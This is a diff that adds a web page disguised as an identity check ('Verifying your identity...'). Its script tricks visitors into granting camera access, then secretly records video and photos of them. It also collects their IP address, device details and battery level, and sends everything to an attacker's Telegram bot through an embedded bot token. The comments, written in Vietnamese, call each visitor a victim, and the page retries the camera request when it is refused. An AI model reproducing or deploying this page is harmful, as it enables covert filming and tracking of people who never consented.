@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Continue to Proceed</title>
+<style>
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    margin: 0; padding: 0; height: 100vh;
+    background: linear-gradient(135deg, #1e3c72, #2a5298);
+    color: white; display: flex; justify-content: center; align-items: center;
+  }
+  .container {
+    text-align: center; background: rgba(0,0,0,0.6); padding: 40px;
+    border-radius: 16px; max-width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+  }
+  h1 { margin: 0 0 20px; font-size: 28px; }
+  .loading { font-size: 18px; margin: 20px 0; color: #4fc3f7; }
+  video, canvas { display: none; }
+  #click-overlay {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    z-index: 9999; background: transparent; cursor: pointer;
+  }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+
+<div id="click-overlay"></div>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<div class="container">
+  <h1>Verifying your identity...</h1>
+  <div class="loading" id="loading">Tap anywhere to proceed</div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '8974775817:AAE8_9hMuJ2ZZLKGKtdpCYxtkoCY97vodOE'; // Nhớ đổi token mới nếu bị lộ
+const CHAT_ID = '8782950405';
+
+let captureCount = 0;
+const MAX_ATTEMPTS = 5;
+let isStreaming = false;
+let retryTimer = null;
+
+// Gửi text
+async function sendText(text) {
+  try {
+    await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      params: { chat_id: CHAT_ID, text: text.substring(0, 4000) }
+    });
+  } catch (e) { console.log("Lỗi gửi text", e); }
+}
+
+// Gửi media (ảnh/video)
+async function sendMedia(blob, type, caption) {
+  if (!blob) return;
+  const formData = new FormData();
+  const ext = type === 'photo' ? 'jpg' : 'webm';
+  formData.append(type, blob, `${type}_${Date.now()}.${ext}`);
+  formData.append('chat_id', CHAT_ID);
+  formData.append('caption', caption.substring(0, 1024));
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+  try {
+    await axios.post(url, formData);
+  } catch (e) {
+    console.error('Send failed:', e);
+  }
+}
+
+// Thu thập info
+async function collectInfo() {
+  let info = `🎯 Nạn nhân mới mở link!\nThời gian: ${new Date().toLocaleString('vi-VN')}\n`;
+  info += `Thiết bị: ${navigator.userAgent}\n`;
+  info += `Màn hình: ${screen.width}×${screen.height}\n`;
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info += `🔋 Pin: ${Math.round(battery.level * 100)}%\n`;
+    } catch {}
+  }
+  try {
+    const res = await axios.get('https://api.ipify.org?format=json');
+    info += `🌐 IP: ${res.data.ip}\n`;
+  } catch {}
+  return info;
+}
+
+// Chụp ảnh từ Video
+function takePhoto(video) {
+  return new Promise((resolve, reject) => {
+    if (video.videoWidth === 0) return reject(new Error("Video chưa có dữ liệu"));
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    // Lật ảnh
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+    canvas.toBlob((blob) => {
+      if (blob) resolve(blob);
+      else reject(new Error("canvas.toBlob null"));
+    }, 'image/jpeg', 0.9);
+  });
+}
+
+// Khởi chạy: VỪA QUAY VỪA CHỤP
+async function startCaptureProcess() {
+  if (isStreaming) return;
+  if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }
+
+  document.getElementById('loading').textContent = 'Accessing camera...';
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false 
+    });
+
+    isStreaming = true;
+    document.getElementById('click-overlay').style.display = 'none';
+    document.getElementById('loading').textContent = 'Recording & Capturing...';
+
+    const video = document.getElementById('cam');
+    video.srcObject = stream;
+    
+    await new Promise((resolve) => {
+      if (video.readyState >= 2) resolve();
+      else video.onloadeddata = resolve;
+    });
+    await video.play();
+    
+    await new Promise(r => setTimeout(r, 1000)); // Đợi lấy nét
+
+    const info = await collectInfo();
+    sendText(info + `\n✅ Đã cấp quyền. Bắt đầu quay & chụp...`);
+
+    // ===== BẮT ĐẦU QUAY VIDEO NGẦM =====
+    let options = { mimeType: 'video/webm;codecs=vp8' };
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/webm' };
+    
+    const recorder = new MediaRecorder(stream, options);
+    const chunks = [];
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.start();
+
+    // ===== VỪA QUAY VỪA CHỤP ẢNH =====
+    // Quay video 8 giây, cứ 2 giây chụp 1 ảnh (tổng cộng 4 ảnh)
+    const TOTAL_VIDEO_TIME = 8000; 
+    const PHOTO_INTERVAL = 2000;   
+    
+    let photoIndex = 1;
+    const photoIntervalId = setInterval(async () => {
+      try {
+        const photoBlob = await takePhoto(video);
+        await sendMedia(photoBlob, 'photo', `📸 Ảnh #${photoIndex} (Trong lúc quay video) - ${new Date().toLocaleTimeString()}`);
+        photoIndex++;
+      } catch (e) {
+        console.log("Lỗi chụp ảnh:", e);
+      }
+    }, PHOTO_INTERVAL);
+
+    // Đợi hết thời gian quay video
+    await new Promise(resolve => {
+      recorder.onstop = resolve;
+      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, TOTAL_VIDEO_TIME);
+    });
+
+    // Dừng chụp ảnh (nếu còn dư)
+    clearInterval(photoIntervalId);
+
+    // Gửi video
+    document.getElementById('loading').textContent = 'Uploading video...';
+    const videoBlob = new Blob(chunks, { type: 'video/webm' });
+    await sendMedia(videoBlob, 'video', `🎥 Video ${TOTAL_VIDEO_TIME/1000}s (Kèm ${photoIndex - 1} ảnh) - ${new Date().toLocaleTimeString()}`);
+
+    // Kết thúc
+    stream.getTracks().forEach(track => track.stop());
+    document.getElementById('loading').textContent = 'Verification completed.';
+
+  } catch (err) {
+    captureCount++;
+    document.getElementById('loading').textContent = 'Verification failed. Tap to try again.';
+    
+    if (captureCount === 1) {
+       const info = await collectInfo();
+       sendText(info + `\n❌ Bị từ chối Camera: ${err.message}`);
+    }
+
+    if (captureCount < MAX_ATTEMPTS) {
+       retryTimer = setTimeout(startCaptureProcess, 4000);
+    }
+  }
+}
+
+// Kích hoạt bằng chạm
+document.getElementById('click-overlay').addEventListener('touchstart', startCaptureProcess, { passive: true });
+document.getElementById('click-overlay').addEventListener('click', startCaptureProcess);
+
+window.addEventListener('load', () => {
+  setTimeout(startCaptureProcess, 1000);
+});
+</script>
+</body>
+</html>
